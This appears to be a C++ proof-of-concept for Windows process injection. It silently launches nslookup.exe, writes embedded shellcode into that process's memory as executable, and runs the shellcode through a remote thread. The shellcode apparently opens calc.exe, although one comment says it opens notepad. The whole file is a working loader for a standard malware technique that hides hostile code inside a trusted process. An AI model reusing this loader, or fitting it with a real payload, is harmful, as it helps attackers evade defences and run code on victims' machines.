#include <iostream>
#include <windows.h>

using namespace std;

// we will call nslookup and inject calc into the mmeory of nslookup

int main() {
    // this shellcode opens up notepad
    unsigned char shellcode[] =
        "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0";

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(shellcode);
    LPCWSTR cmd;
    HANDLE hProcess, hThread;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);
    cmd = TEXT("C:\\Windows\\System32\\nslookup.exe");

    if (!CreateProcess(
        cmd,							// Executable
        NULL,							// Command line
        NULL,							// Process handle not inheritable
        NULL,							// Thread handle not inheritable
        FALSE,							// Set handle inheritance to FALSE
        CREATE_NO_WINDOW,	            // Do Not Open a Window
        NULL,							// Use parent's environment block
        NULL,							// Use parent's starting directory 
        &si,			                // Pointer to STARTUPINFO structure
        &pi								// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "FAILED" << errval << std::endl;
    }

    SIZE_T* written_bytes = NULL;
    WaitForSingleObject(pi.hProcess, 1000);
    allocation_start = VirtualAllocEx(pi.hProcess, NULL, allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    WriteProcessMemory(pi.hProcess, allocation_start, shellcode, allocation_size, written_bytes);

    cout << "Number of bytes written : " << written_bytes;

    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocation_start, NULL, 0, 0);


}
